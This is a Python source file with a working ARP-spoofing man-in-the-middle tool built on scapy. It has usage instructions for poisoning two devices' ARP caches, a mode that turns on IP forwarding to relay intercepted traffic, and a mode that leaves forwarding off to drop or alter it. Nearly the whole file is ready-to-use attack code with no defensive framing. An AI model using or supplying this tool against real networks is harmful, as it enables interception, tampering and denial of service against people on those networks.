import scapy.all as scapy
import threading
from time import sleep
import os
import logging

logging.basicConfig(format='%(levelname)s - %(asctime)s - %(message)s',
                    datefmt='%d-%b-%y %H:%M:%S',
                    level=logging.INFO)


class ArpPoison(threading.Thread):
    """
    Arp spoofing MiTM  - 2 Modes:
    1 Way - IP Forwarding off (drop/alter)
    2 Way - IP Forwarding on (forward)

    USAGE:
    from arpspoof import ArpPoison  # import class
    arp_object = ArpPoison(DeviceA_IP_MAC, DeviceB_IP_MAC, localhost_IP_MAC, IP_Forward_Bool)  # declare class object
    arp_object.start()     # start MiTM
    arp_object.stop()      # stop MiTM

    This class inherent from Thread library for background usage.
    (Works on linux only - Tested with Kali Linux)
    """
    def __init__(self, deviceA, deviceB, localhost, ip_fwd=False):
        super(ArpPoison, self).__init__()
        self._stop_event = threading.Event()
        self.deviceA = deviceA
        self.deviceB = deviceB
        self.localhost = localhost
        self.IP_FWD = ip_fwd
        self.stop_signal = False

    def run(self):
        self.stop_signal = False
        if self.IP_FWD:
            logging.info('[*] Enabling IP forwarding')
            os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
            while not self.stop_signal:
                scapy.send(scapy.ARP(op=2,
                                     pdst=self.deviceA.IP,
                                     psrc=self.deviceB.IP,
                                     hwsrc=self.localhost.MAC), verbose=0)
                scapy.send(scapy.ARP(op=2,
                                     pdst=self.deviceB.IP,
                                     psrc=self.deviceA.IP,
                                     hwsrc=self.localhost.MAC), verbose=0)
                sleep(0.1)
        else:
            logging.info('[*] IP forwarding disabled')
            while not self.stop_signal:
                scapy.send(scapy.ARP(op=2,
                                     pdst=self.deviceA.IP,
                                     psrc=self.deviceB.IP,
                                     hwsrc=self.localhost.MAC), verbose=0)
                sleep(0.1)

    def stop(self):
        self.stop_signal = True
        logging.info('[*] Disabling IP forwarding')
        for i in range(3):
            scapy.send(scapy.ARP(op=2,
                                 hwdst='FF:FF:FF:FF:FF:FF',
                                 pdst=self.deviceA.IP,
                                 hwsrc=self.deviceB.MAC,
                                 psrc=self.deviceB.IP), count=20)
            if self.IP_FWD:
                scapy.send(scapy.ARP(op=2,
                                     hwdst='FF:FF:FF:FF:FF:FF',
                                     pdst=self.deviceB.IP,
                                     hwsrc=self.deviceA.MAC,
                                     psrc=self.deviceA.IP), count=20)
                os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

            sleep(0.1)
